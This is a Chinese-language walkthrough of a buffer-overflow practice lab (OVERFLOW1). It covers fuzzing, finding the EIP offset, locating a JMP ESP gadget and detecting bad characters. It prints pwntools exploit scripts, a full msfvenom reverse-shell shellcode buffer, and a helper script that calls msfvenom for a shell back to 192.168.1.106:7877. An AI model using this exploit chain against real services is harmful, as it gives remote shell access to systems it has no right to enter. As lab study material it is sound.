# Buffer Overflow Prep OVERFLOW1
- Immunity debugger 快捷鍵
	- Ctrl + F2 重開
	- F9 開始
	
## 觀察 
- nc 上去，決定這次的目標是 `OVERFLOW1`
	-  ![](https://i.imgur.com/qnTQ0Rn.png)

## Fuzz
- 準備 `Overflow1.spk`
```C
s_readline();
s_string("OVERFLOW1 ");
s_string_variable("0");
```
- 執行 `generic_send_tcp 192.168.1.102 1337 Overflow1.spk 0 0
`
- Run 下去他就爛ㄌ
	- ![](https://i.imgur.com/89HNTl2.png)
	- 可以觀察到 EIP 變成 41414141
	- ![](https://i.imgur.com/xpGvUrG.png)

## Cyclic 找 Offset
```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
cy = cyclic()

payload = perfix + cy

r.sendline(payload)
```
- 觀察 EIP 變成 `61757461`
	- ![](https://i.imgur.com/1BTGO9u.png)
- `pwn cyclic -l 0x61757461`
	- ![](https://i.imgur.com/hjLOr0q.png)
	- Offset 為 1978
- 重新測試
```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978

payload = perfix + padding + b'bbbb'

r.sendline(payload)
```
![](https://i.imgur.com/JrLxWEq.png)

發現 EIP 順利蓋成了 "bbbb" (62626262)

## 紀錄繼續蓋的資料
- 先繼續蓋一波，觀察資料會蓋去哪
```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
payload = perfix + padding + return_address + cyclic()

r.sendline(payload)
```
- 發現會直接蓋到 ESP
	- ![](https://i.imgur.com/offxAM5.png)


## 尋找 Return Address
- 輸入 `!mona jmp -r esp `
	- ![](https://i.imgur.com/P4lbInG.png)
	- 可以找到 `0x625011af`

## 尋找 Badword
(使用到的腳本在最下面)
- 測試 BadWord
```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
badword = bytes([i for i in range(1,0xff+1)])
payload = perfix + padding + return_address + badword

r.sendline(payload)
```

- 對 ESP 選 Follow in dump
	- ![](https://i.imgur.com/DV7CICB.png)
- 複製出來存到 dump.txt
	- ![](https://i.imgur.com/V7wIQew.png)
- 執行神奇小腳本
	- ![](https://i.imgur.com/QfusPuZ.png)
	- 因為 Badword 有可能會影響到下一個 Bytes，所以圈出來的部分需要重新測試

```python
from pwn import *
r = remote("192.168.1.102",1337)

perfix = b"OVERFLOW1 "
padding = b'a' * 1978
return_address = b'bbbb'
badword = b"\x01\x07\x01\x08\x01\x2E\x01\x2F\x01\xA0\x01\xA1"
payload = perfix + padding + return_address + badword

r.sendline(payload)
```

- 取得新的資料貼到 `dump2.txt`
	- 輸入 `\x00\x07\x2e\xa0`
	- ![](https://i.imgur.com/hjhBOMg.png)
- 取得 Badword 為 `\x00\x07\x2e\xa0`
- 並自動產出 Exploit
	- ![](https://i.imgur.com/0Dn4Bfu.png)


## 套用 Exploit
```python
buf =  b""
buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x99\x81\xa9\xdb\x83\xee\xfc\xe2\xf4\x65\x69"
buf += b"\x2b\xdb\x99\x81\xc9\x52\x7c\xb0\x69\xbf\x12\xd1\x99"
buf += b"\x50\xcb\x8d\x22\x89\x8d\x0a\xdb\xf3\x96\x36\xe3\xfd"
buf += b"\xa8\x7e\x05\xe7\xf8\xfd\xab\xf7\xb9\x40\x66\xd6\x98"
buf += b"\x46\x4b\x29\xcb\xd6\x22\x89\x89\x0a\xe3\xe7\x12\xcd"
buf += b"\xb8\xa3\x7a\xc9\xa8\x0a\xc8\x0a\xf0\xfb\x98\x52\x22"
buf += b"\x92\x81\x62\x93\x92\x12\xb5\x22\xda\x4f\xb0\x56\x77"
buf += b"\x58\x4e\xa4\xda\x5e\xb9\x49\xae\x6f\x82\xd4\x23\xa2"
buf += b"\xfc\x8d\xae\x7d\xd9\x22\x83\xbd\x80\x7a\xbd\x12\x8d"
buf += b"\xe2\x50\xc1\x9d\xa8\x08\x12\x85\x22\xda\x49\x08\xed"
buf += b"\xff\xbd\xda\xf2\xba\xc0\xdb\xf8\x24\x79\xde\xf6\x81"
buf += b"\x12\x93\x42\x56\xc4\xe9\x9a\xe9\x99\x81\xc1\xac\xea"
buf += b"\xb3\xf6\x8f\xf1\xcd\xde\xfd\x9e\x7e\x7c\x63\x09\x80"
buf += b"\xa9\xdb\xb0\x45\xfd\x8b\xf1\xa8\x29\xb0\x99\x7e\x7c"
buf += b"\x8b\xc9\xd1\xf9\x9b\xc9\xc1\xf9\xb3\x73\x8e\x76\x3b"
buf += b"\x66\x54\x3e\xb1\x9c\xe9\x69\x73\x98\xe7\xc1\xd9\x99"
buf += b"\x9f\x6c\x52\x7f\xeb\xb9\x8d\xce\xe9\x30\x7e\xed\xe0"
buf += b"\x56\x0e\x1c\x41\xdd\xd7\x66\xcf\xa1\xae\x75\xe9\x59"
buf += b"\x6e\x3b\xd7\x56\x0e\xf1\xe2\xc4\xbf\x99\x08\x4a\x8c"
buf += b"\xce\xd6\x98\x2d\xf3\x93\xf0\x8d\x7b\x7c\xcf\x1c\xdd"
buf += b"\xa5\x95\xda\x98\x0c\xed\xff\x89\x47\xa9\x9f\xcd\xd1"
buf += b"\xff\x8d\xcf\xc7\xff\x95\xcf\xd7\xfa\x8d\xf1\xf8\x65"
buf += b"\xe4\x1f\x7e\x7c\x52\x79\xcf\xff\x9d\x66\xb1\xc1\xd3"
buf += b"\x1e\x9c\xc9\x24\x4c\x3a\x49\xc6\xb3\x8b\xc1\x7d\x0c"
buf += b"\x3c\x34\x24\x4c\xbd\xaf\xa7\x93\x01\x52\x3b\xec\x84"
buf += b"\x12\x9c\x8a\xf3\xc6\xb1\x99\xd2\x56\x0e"
```


- ![](https://i.imgur.com/wxHQnYU.png)
	- 成功 !!


## 附錄
### 第一階段尋找 Badwords
`find_badwords1.py`
```python
with open("dump.txt",'r') as f:
    s = f.read()

s = s.split("\n")

new_array = []
for l in s:
    t = l.split("  ")
    new_array += t[1].split(" ")

full_array = [hex(i)[2:].upper().zfill(2) for i in range(1,0xff+1)]
badwords = [r'\x00']

non_badword = []
for i,j in zip(new_array,full_array):
    if i != j:
        badwords.append(r"\x"+j)
        # print(i,j)
    else:
        non_badword.append(r"\x"+j)

print("Probably Badword : ",''.join(badwords).lower())

print("Next Try : b\"" , end='')
for i in badwords[1:]: # null must bad
    print(non_badword[0]+i,end='')
print("\"")
```

### 第二階段尋找 Badwords + 自動 Exploit
`find_badwords1.py`
```python
import os
with open("dump2.txt",'r') as f:
    s = f.read()

s = s.split("\n")

new_array = []
for l in s:
    t = l.split("  ")
    new_array += t[1].split(" ")

new_array = new_array[1::2]
p = list(eval(input("Try payload : ")))
p = p[1::2]
p = [hex(i)[2:].upper().zfill(2) for i in p]

bad_words = [r'\x00']
for i,j in zip(new_array,p):
    if i != j:
        bad_words.append(r"\x"+j)

print("Badword : ",''.join(bad_words).lower())


ip = "192.168.1.106"
port = 7877
os.system(f'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} EXITFUNC=thread -f python -a x86 -b "{bad_words}"')
```